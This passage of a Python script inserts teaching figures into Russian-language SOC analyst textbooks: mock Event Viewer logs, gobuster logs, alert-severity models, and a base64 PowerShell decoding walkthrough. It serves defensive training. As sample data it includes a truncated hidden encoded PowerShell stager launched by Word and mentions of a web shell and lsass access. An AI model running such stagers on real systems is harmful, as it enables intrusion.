                {"f": 0, "t": 1, "text": "TGS-REQ ×40 разных служб, RC4", "kind": "bad", "note": "А так выглядит атака: одна учётка за минуты просит билеты к десяткам служб и к серверу не ходит. Алерт по 4769."}]})),
        ("Как устроена смена", "end", fig("ad-eventviewer", "ui", "Тот самый журнал в Event Viewer",
            "Учебный пример по сюжету: интерфейс нарисован, события выдуманы, но поля и коды — как в настоящем журнале Security.",
            {"app": "eventviewer", "title": "Просмотр событий · Журналы Windows › Безопасность",
             "cols": ["Уровень", "Дата и время", "Источник", "Код", "Категория"],
             "rows": [["Сведения", "14.09.2026 14:06:51", "Security-Auditing", "4624", "Logon"],
                      ["Сведения", "14.09.2026 14:07:12", "Security-Auditing", "4688", "Process Creation"],
                      ["Сведения", "14.09.2026 14:07:13", "Security-Auditing", "4688", "Process Creation"],
                      ["Сведения", "14.09.2026 14:21:40", "Security-Auditing", "4769", "Kerberos Service Ticket Operations"],
                      ["Сведения", "14.09.2026 14:21:41", "Security-Auditing", "4769", "Kerberos Service Ticket Operations"],
                      ["Сведения", "14.09.2026 14:35:02", "Eventlog", "1102", "Log clear"]],
             "sel": 2,
             "detail": ["Учётная запись: m.becker · Тип входа: 2 (интерактивный) · Рабочая станция WS-DISPO-03",
                        "Новый процесс: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nРодитель: C:\\Windows\\explorer.exe",
                        "Новый процесс: C:\\Windows\\System32\\cmd.exe\nРодитель: …\\Office16\\WINWORD.EXE   ← Word запустил оболочку\nКомандная строка: cmd.exe /c powershell -nop -w hidden -enc JABXAEMAPQBO…",
                        "Имя службы: MSSQLSvc/db01.nordstern.local:1433\nТип шифрования билета: 0x17 (RC4)\nАдрес клиента: ::ffff:192.168.20.43",
                        "Имя службы: HTTP/intranet.nordstern.local\nТип шифрования билета: 0x17 (RC4)\nАдрес клиента: ::ffff:192.168.20.43",
                        "Журнал аудита очищен. Учётная запись: m.becker   ← заметание следов"]})),
        ("Как устроена смена", "end", fig("ad-severity", "severity", "Приоритет алерта: подвигай факторы",
            "Учебная модель для тренировки: у каждой компании свой runbook и своя шкала, но логика похожая.",
            {"factors": [
                {"name": "Какой хост", "opts": [["рабочая станция", 1], ["сервер", 2], ["контроллер домена или бэкапы", 3]]},
                {"name": "Насколько уверен детект", "opts": [["шумное правило", 0], ["обычно точное", 1], ["почти без ложных", 2]], "def": 1},
                {"name": "Есть ли признак успеха", "opts": [["только попытка", 0], ["что-то получилось", 2]]},
                {"name": "Чья учётка", "opts": [["обычная", 0], ["привилегированная или сервисная", 2]]},
                {"name": "Контекст", "opts": [["ожидаемо (работы, пентест)", 0], ["ночь, отпуск, новая страна", 1]]}],
             "levels": [[0, "Low", "good", "Закрыть с обоснованием или наблюдать. Обязательно записать, почему."], [3, "Medium", "warn", "Разобрать в рамках SLA, обогатить индикаторы, при сомнении — к L2."],
                        [5, "High", "bad", "Эскалировать на L2 с таймлайном и индикаторами в рамках SLA."], [8, "Critical", "bad", "Немедленно на L2 и по runbook. Сам ничего не изолируешь и не блокируешь — это не роль L1."]]})),
    ]

    # ===== Cyber Security 101 · модуль 1
    S["cs101-01"] = [
        ("Глава 1\\. Атака глазами защитника", "end", ill("ill-cs101", "cs101-01", "Атакующий перебирает каталоги сайта, а аналитик видит это в логе", "Иллюстрация: перебор каталогов глазами атакующего и защитника — один и тот же поток запросов с двух сторон.")),
        ("Вживую: как этот перебор выглядит в логе", "end", fig("gobuster-diff", "diff", "Человек и перебор: одна страница, разный след",
            "Учебный пример: адреса из RFC 5737, сайт выдуман. Слева живой браузер, справа gobuster.",
            {"a": {"title": "Человек в браузере", "lines": [
                "198.51.100.23 GET /login 200 \"Chrome\"",
                "198.51.100.23 GET /static/app.css 200 ref:/login",
                "198.51.100.23 GET /static/logo.svg 200 ref:/login",
                "198.51.100.23 GET /static/app.js 200 ref:/login",
                "198.51.100.23 POST /login 302 ref:/login"]},
             "b": {"title": "Перебор каталогов", "lines": [
                "203.0.113.45 GET /admin 404 \"gobuster/3.8.2\"",
                "203.0.113.45 GET /backup 404 \"gobuster/3.8.2\"",
                "203.0.113.45 GET /config 404 \"gobuster/3.8.2\"",
                "203.0.113.45 GET /login 200 \"gobuster/3.8.2\"",
                "203.0.113.45 GET /old 404 \"gobuster/3.8.2\"",
                "203.0.113.45 GET /uploads 301 \"gobuster/3.8.2\""]}})),
        ("Процесс$", "end", fig("enrich-graph", "graph", "Обогащение индикатора: куда что нести",
            "Схема по этой главе: сначала внутренние источники, потом пассивные внешние, ничего не открываем и не скачиваем.",
            {"nodes": [{"id": "alert", "label": "Алерт", "icon": "alert", "kind": "acc"}, {"id": "ioc", "label": "Индикаторы", "sub": "IP, домен, хеш", "icon": "search"},
                       {"id": "siem", "label": "SIEM", "sub": "кто ещё?", "icon": "siem"}, {"id": "cmdb", "label": "CMDB", "sub": "чей актив?", "icon": "db"},
                       {"id": "vt", "label": "VirusTotal", "sub": "хеш, URL", "icon": "shield"}, {"id": "abuse", "label": "AbuseIPDB", "sub": "IP", "icon": "globe"},
                       {"id": "verd", "label": "Вердикт", "sub": "TP / FP / к L2", "icon": "analyst", "kind": "good"}],
             "edges": [["alert", "ioc", "выписать"], ["ioc", "siem", "1"], ["ioc", "cmdb", "1"], ["ioc", "vt", "2"], ["ioc", "abuse", "2"], ["siem", "verd", ""], ["cmdb", "verd", ""], ["vt", "verd", ""], ["abuse", "verd", ""]]})),
        ("Формула приоритета: четыре вопроса вместо одного числа", "end", fig("cve-severity", "severity", "Приоритет уязвимости: четыре вопроса",
            "Учебная модель по формуле этой главы. Четвёртый вопрос — шлагбаум: нет у нас, значит не наш пожар.",
            {"factors": [
                {"name": "Насколько плохо, если сработает (CVSS)", "opts": [["низкий", 1], ["средний", 2], ["высокий", 3], ["критический 9+", 4]], "def": 3},
                {"name": "Насколько вероятно, что попробуют (EPSS)", "opts": [["< 1%", 0], ["1–10%", 1], ["> 10%", 3]]},
                {"name": "Эксплуатируют ли уже сейчас (KEV, CERT-Bund)", "opts": [["нет данных", 0], ["да", 4]]},
                {"name": "Есть ли это у нас и видно ли снаружи", "gate": True, "opts": [["нет у нас", 0], ["есть внутри", 1], ["есть и смотрит в интернет", 3]], "def": 1}],
             "levels": [[0, "Ждёт планового обновления", "good", "Нет у нас или риск низкий: закрыть плановым патчем."], [5, "В этом цикле обновлений", "warn", "Поставить в ближайшее окно обслуживания и проверить компенсирующие меры."],
                        [9, "Срочно", "bad", "Патч или временная защита в ближайшие дни, проверить логи на следы эксплуатации."], [12, "Немедленно", "bad", "Эксплуатируется и торчит наружу: экстренное окно, параллельно поиск следов компрометации."]]})),
    ]

    # ===== Pre Security 1–4
    S["ps-01-04"] = [
        ("Как пользоваться этим учебником", "start", ill("ill-ps", "ps-01-04", "Карта первых шагов в кибербезопасности: компьютер, сеть, система и данные", "Иллюстрация: четыре слоя, из которых складывается любой инцидент — железо, сеть, операционная система и данные.")),
        ("Четыре фазы incident response", "end", fig("soc-graph", "graph", "Путь алерта в SOC",
            "Учебная схема: кто что делает со срабатыванием, от сенсора до решения.",
            {"nodes": [{"id": "src", "label": "Источники", "sub": "хосты, сеть, почта", "icon": "server"}, {"id": "siem", "label": "SIEM", "sub": "правила", "icon": "siem"},
                       {"id": "l1", "label": "L1", "sub": "триаж", "icon": "analyst", "kind": "acc"}, {"id": "fp", "label": "Закрыт", "sub": "FP с обоснованием", "icon": "file", "kind": "good"},
                       {"id": "l2", "label": "L2 / IR", "sub": "расследование", "icon": "shield"}, {"id": "cl", "label": "Клиент", "sub": "меры и отчёт", "icon": "mail"}],
             "edges": [["src", "siem", "логи"], ["siem", "l1", "алерт"], ["l1", "fp", "ложный"], ["l1", "l2", "эскалация", "bad"], ["l2", "cl", ""]]})),
        ("Нормальные процессы Windows", "end", fig("normal-ptree", "ptree", "Норма: родословная системных процессов",
            "По этой главе и плакату SANS «Hunt Evil». Всё, что не так в этом дереве, — находка.",
            {"root": {"n": "System", "note": "ядро, PID 4", "c": [
                {"n": "smss.exe", "note": "один, из System32", "c": [
                    {"n": "csrss.exe", "note": "по одному на сессию"},
                    {"n": "wininit.exe", "note": "один", "c": [
                        {"n": "services.exe", "note": "один", "c": [{"n": "svchost.exe", "note": "много, родитель всегда services.exe"}]},
                        {"n": "lsass.exe", "note": "ровно один и только из System32 — второй экземпляр это находка"}]},
                    {"n": "winlogon.exe", "note": "по одному на сессию", "c": [{"n": "userinit.exe", "note": "завершается после входа", "c": [{"n": "explorer.exe", "note": "оболочка пользователя, из C:\\Windows"}]}]}]}]}})),
        ("Вживую: PowerShell, который прячется в base64", "end", fig("b64-decode", "decode", "Раскодируем -enc по шагам",
            "Пример из этой главы. Так же делает CyberChef: From Base64 → Decode text (UTF-16LE).",
            {"input": "powershell -enc dwBoAG8AYQBtAGkA",
             "steps": [{"op": "Взять строку после -enc", "out": "dwBoAG8AYQBtAGkA"},
                       {"op": "From Base64", "out": "77 00 68 00 6f 00 61 00 6d 00 69 00", "note": "Между буквами нулевые байты: это UTF-16LE, а не «битый файл»."},
                       {"op": "Наивно как ASCII", "out": "w.h.o.a.m.i.", "note": "Здесь новички и застревают."},
                       {"op": "Decode text UTF-16LE", "out": "whoami", "note": "Готово. А если строка начинается с JAB — это $ в UTF-16LE, почти всегда стейджер."}]})),
        ("ЧАСТЬ V\\. Один инцидент", "end", fig("ps-chain", "chain", "Инцидент части V на оси атаки",
            "Учебный сценарий этой части. Этапы — тактики MITRE ATT&CK v20.",
            {"stages": [
                {"name": "Reconnaissance", "ru": "разведка", "state": "done", "note": "23:14 — 4200 запросов за две минуты, 98% ответов 404: перебор каталогов (T1595.003)."},
                {"name": "Initial Access", "ru": "первичный доступ", "state": "done", "note": "23:18 — пробы SQL-инъекции с двойным URL-кодированием, ответы 500."},
                {"name": "Persistence", "ru": "закрепление", "state": "done", "note": "23:31 — в каталоге загрузок появился .php — веб-шелл (T1505.003)."},
                {"name": "Execution", "ru": "запуск", "state": "cur", "note": "23:34 — w3wp.exe запускает powershell.exe -enc: веб-сервер не должен запускать оболочку."},
                {"name": "Credential Access", "ru": "учётные данные", "state": "", "note": "Дальше атакующий потянется к паролям и lsass."},
                {"name": "Impact", "ru": "ущерб", "state": "", "note": "Если не остановить — данные и шифрование."}]})),
        ("События учётных записей", "end", fig("ps-events", "event", "Цепочка захвата: 4720 → 4732 → 4672",
            "Справка по документации Microsoft, журнал Security.",
            {"cards": [
                {"id": "4720", "name": "Создана учётная запись", "log": "Security", "kind": "warn", "fields": [["SubjectUserName", "кто создал"], ["PrimaryGroupId", "513 — обычная"]], "look": "кто создал и не стоит ли флаг «пароль не требуется»."},
                {"id": "4732", "name": "Добавлен в локальную группу", "log": "Security", "kind": "warn", "fields": [["TargetUserName", "имя группы"], ["MemberName", "кого добавили"]], "look": "Administrators сразу после 4720."},
                {"id": "4672", "name": "Особые привилегии при входе", "log": "Security", "kind": "bad", "fields": [["SubjectUserName", "кому выдали"], ["PrivilegeList", "SeDebugPrivilege и др."]], "look": "обычная учётка с SeDebugPrivilege через минуты после создания — захват."}]})),
    ]

    # ===== Offensive Security Intro
    S["x-offensive-intro"] = [
        ("01Что такое offensive security", "start", ill("ill-off", "x-offensive-intro", "Атакующий и защитник смотрят на один и тот же сайт с двух сторон", "Иллюстрация: одна и та же атака глазами атакующего и глазами защитника.")),
        ("04Как это выглядит в логах", "end", fig("off-top", "topn", "Кто генерирует 404",
            "Учебный лог этой главы: адреса из RFC 5737. Числа совпадают с выводом awk выше.",
            {"items": [["203.0.113.45", 8, "bad"], ["192.0.2.77", 1]], "unit": "ответов 404 с адреса"})),
        ("04Как это выглядит в логах", "end", fig("off-siem", "siem", "Покрути этот лог сам",
            "Учебный access.log этой главы, адреса из RFC 5737.",
            {"cols": ["IP", "Время", "Запрос", "Код", "User-Agent"], "filter": [0, 3], "rows": [
                ["192.0.2.77", "02:10:41", "GET /", "200", "Chrome/128.0"], ["192.0.2.77", "02:10:42", "GET /favicon.ico", "404", "Chrome/128.0"],
                ["203.0.113.45", "02:14:03", "GET /admin", "404", "gobuster/3.8.2"], ["203.0.113.45", "02:14:03", "GET /backup", "404", "gobuster/3.8.2"],
                ["203.0.113.45", "02:14:04", "GET /config", "404", "gobuster/3.8.2"], ["203.0.113.45", "02:14:04", "GET /login", "200", "gobuster/3.8.2"],
                ["203.0.113.45", "02:14:05", "GET /old", "404", "gobuster/3.8.2"], ["203.0.113.45", "02:14:05", "GET /test", "404", "gobuster/3.8.2"],
                ["203.0.113.45", "02:14:06", "GET /uploads", "301", "gobuster/3.8.2"], ["203.0.113.45", "02:14:06", "GET /api", "404", "gobuster/3.8.2"],
                ["203.0.113.45", "02:14:07", "GET /dev", "404", "gobuster/3.8.2"], ["203.0.113.45", "02:14:07", "GET /bank-transfer", "200", "gobuster/3.8.2"],
                ["203.0.113.45", "02:17:12", "POST /bank-transfer", "200", "Firefox/128.0"], ["66.249.66.1", "03:02:11", "GET /robots.txt", "200", "Googlebot/2.1"],
                ["198.51.100.9", "08:15:20", "GET /", "200", "Chrome/128.0"], ["198.51.100.9", "08:15:21", "GET /login", "200", "Chrome/128.0"]],
             "tasks": ["отфильтруй код 404 — с какого адреса почти все?", "что сделал 203.0.113.45 после перебора?", "найди gobuster в User-Agent и сравни с последним POST"]})),
        ("05Схема: путь атакующего", "end", fig("off-graph", "graph", "Путь атакующего и что остаётся в логе",
            "Учебная схема по этой главе.",
            {"nodes": [{"id": "a", "label": "Атакующий", "sub": "203.0.113.45", "icon": "attacker", "kind": "bad"}, {"id": "g", "label": "gobuster", "sub": "перебор путей", "icon": "terminal"},
                       {"id": "w", "label": "Веб-сервер", "sub": "fakebank", "icon": "server"}, {"id": "p", "label": "/bank-transfer", "sub": "забытая страница", "icon": "browser", "kind": "bad"},
                       {"id": "l", "label": "access.log", "sub": "404 пачкой + User-Agent", "icon": "log", "kind": "acc"}, {"id": "s", "label": "Аналитик", "sub": "видит след", "icon": "analyst", "kind": "good"}],
             "edges": [["a", "g", "запускает"], ["g", "w", "сотни GET", "bad"], ["w", "p", "200 OK", "bad"], ["w", "l", "пишет"], ["l", "s", "читает"]]})),
    ]
    return S


# ---------------------------------------------------------------- вставка
HEAD_RX = re.compile(r"<h([1-3])\b[^>]*>(.*?)</h\1>", re.S)


def plain(x):
    return re.sub(r"\s+", " ", html.unescape(re.sub(r"<[^>]+>", "", x))).strip()


def insert(s, heading_rx, pos, block):
    heads = list(HEAD_RX.finditer(s))
    for i, m in enumerate(heads):
        if re.match(heading_rx, plain(m.group(2))):
            if pos == "start":
                return s[: m.end()] + block + s[m.end():]
            lvl = int(m.group(1))
            for n in heads[i + 1:]:
                if int(n.group(1)) <= max(lvl, 2) or int(n.group(1)) <= lvl:
                    return s[: n.start()] + block + s[n.start():]
            return s + block
    raise SystemExit(f"не нашёл заголовок: {heading_rx}")


def main():
    S = specs()
    for book, items in S.items():
        f = ROOT / "books" / f"{book}.html"
        s = f.read_text(encoding="utf8")
        s = re.sub(r"<!--thv:([\w-]+)-->.*?<!--/thv:\1-->", "", s, flags=re.S)
        # одинаковые якоря: вставляем в обратном порядке, чтобы блоки шли в порядке списка
        for heading, pos, block in reversed(items):
            s = insert(s, heading, pos, block)
        f.write_text(s, encoding="utf8")
        print(f"{book}: блоков {len(items)}")


if __name__ == "__main__":
    main()
